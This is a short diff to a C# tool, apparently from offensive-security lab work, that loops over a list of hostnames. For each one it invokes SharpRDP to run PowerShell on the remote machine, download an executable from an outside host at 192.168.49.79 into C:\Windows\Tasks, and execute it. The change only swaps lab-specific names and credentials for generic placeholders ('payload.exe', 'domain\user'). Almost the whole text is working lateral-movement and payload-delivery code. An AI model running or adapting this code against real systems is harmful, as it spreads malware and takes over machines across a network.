@@ -24,7 +24,7 @@ namespace UploadExec
 
             foreach (string line in lines)
             {
-                String cmd = "SharpRDP.exe computername=" + line + "command='powershell(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.79/AgentSmith.exe', 'C:\\Windows\\Tasks\\AgentSmith.exe'); C:\\Windows\\Tasks\\AgentSmith.exe' username=corp1\\dave password=lab";
+                String cmd = "SharpRDP.exe computername=" + line + "command='powershell(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.79/payload.exe', 'C:\\Windows\\Tasks\\payload.exe'); C:\\Windows\\Tasks\\payload.exe' username=domain\\user password=pass";
                 Console.WriteLine(cmd);
                 ps.AddScript(cmd);
                 ps.Invoke();
